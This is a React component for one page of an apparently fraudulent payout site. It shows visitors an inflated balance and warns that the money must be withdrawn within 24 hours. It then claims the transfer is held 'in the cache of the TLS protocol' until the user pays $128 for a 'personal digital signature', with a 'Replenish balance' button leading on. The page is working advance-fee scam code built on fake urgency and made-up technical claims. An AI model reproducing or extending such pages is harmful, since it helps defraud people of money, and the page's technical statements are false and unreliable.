import moment from "moment"
import { Text, Flex, Box, Icon, Image, Button } from "@chakra-ui/react"
import React from "react"
import ChatCard from "../../components/ChatCard"
import { useSelector } from "react-redux"
import { thousandsFormatter, useGoTo } from "../../utils"
import FormCheckItem from "../../components/FormCheckItem"
import {
  COMMISSION_PAGE,
  COMMISSION_SIGNATUREVERIFY_PAGE
} from "../../constants"

const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_SIGNATUREVERIFY_PAGE}`
// 2-7
const Signatureverify = () => {
  const balance = useSelector(state => state.user.balance)

  const goToNext = useGoTo()

  return (
    <ChatCard
      position={"relative"}
      minH={{ base: "calc(100vh - 112px)", sm: "fit-content" }}
      bodyStyles={{
        padding: { base: "40px 20px 20px", md: "30px" }
      }}
    >
      <Box
        display={"grid"}
        gridTemplateColumns={{ base: "1fr", md: "1fr 1fr" }}
        gridTemplateRows={{ base: "auto", md: "repeat(2, min-content)" }}
        gap={"30px"}
      >
        <Flex
          flexDir={{ base: "column", md: "row" }}
          alignItems={{ base: "center", md: "flex-start" }}
          gap={{ md: "30px" }}
        >
          <Box textAlign={{ base: "center", md: "left" }}>
            <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
              Your payout amount is:
            </Text>
            <Text
              fontSize={{ base: "40px", md: "40px" }}
              fontWeight={"bold"}
              color={"brand.600"}
              background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
              whiteSpace={"nowrap"}
              sx={{
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent"
              }}
            >
              {`$${thousandsFormatter(balance)}`}
              <Text as={"span"} fontSize={"18px"}>
                {" "}
                USD
              </Text>
            </Text>
          </Box>
          <Text
            color={"pink.100"}
            fontSize={{ base: "16px", md: "20px" }}
            textAlign={{ base: "center", md: "left" }}
            width={{ md: "40%" }}
          >
            You need to withdraw money within 24 hours!
          </Text>
        </Flex>
        <Flex
          flexDir={"column"}
          justifyContent={{ md: "flex-start" }}
          gridRow={"span 2"}
        >
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"600"}
            textAlign={{ base: "center", md: "left" }}
          >
            It is necessary to create a digital signature
          </Text>
          <br />
          <Text fontSize={{ base: "16px", md: "20px" }}>
            The transfer of funds <b>${balance}</b> is booked for sending today
            (after 2 minutes). Your translation left the transit cell and was
            placed in the cache of the TLS protocol of your browser! This means
            that the transfer will be made at the above time, if right now you
            put a personal digital signature on receiving funds from the browser
            to the TLS protocol.
            <br />
            <br />
            Most likely, you, like an ordinary Internet user, do not have a
            personal digital signature. We made sure that you did not have to
            look for an organization on your own that could generate it.
            <br />
            <br />
            Therefore, we ourselves are ready to provide you with a service for
            generating a personal digital signature for receiving funds from the
            browser on the TLS protocol.
          </Text>
        </Flex>
        <Flex flexDir={"column"} fontSize={"20px"}>
          <Text fontSize={"20px"} mb={"30px"}>
            Immediately after you receive a personal digital signature in the
            form of a cipher from letters and numbers, it will be confirmed by
            you, in the browser and transfer for the amount of <b>${balance}</b>{" "}
            will be credited to the previously indicated details!
            <br />
            <br />
            The cost of generating digital signatures of total: <b>$128.</b>
          </Text>
          <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
            <FormCheckItem
              checked={true}
              label={"Pay the activation of the transit cell."}
            />
            <FormCheckItem
              checked={true}
              label={"The system automatically activates the cell."}
            />
            <FormCheckItem
              checked={true}
              label={"Your payment will be sent to our detalls."}
            />
          </Flex>
        </Flex>
      </Box>
      <Flex
        flexDir={{ base: "column-reverse", md: "row" }}
        justifyContent={{ md: "space-between" }}
        alignItems={"center"}
      >
        <Image
          src="./img/secure-payment.png"
          w={"120px"}
          margin={{ base: "50px auto", sm: "60px 0 0" }}
        />
        <Flex
          mt={"40px"}
          flexDir={{ base: "column", md: "row" }}
          alignItems={"center"}
        >
          <Button
            mb={"10px"}
            mr={{ md: "40px" }}
            onClick={() => goToNext(nextPage)}
            minW={"150px"}
          >
            Replenish balance
          </Button>
        </Flex>
      </Flex>
    </ChatCard>
  )
}

export default Signatureverify
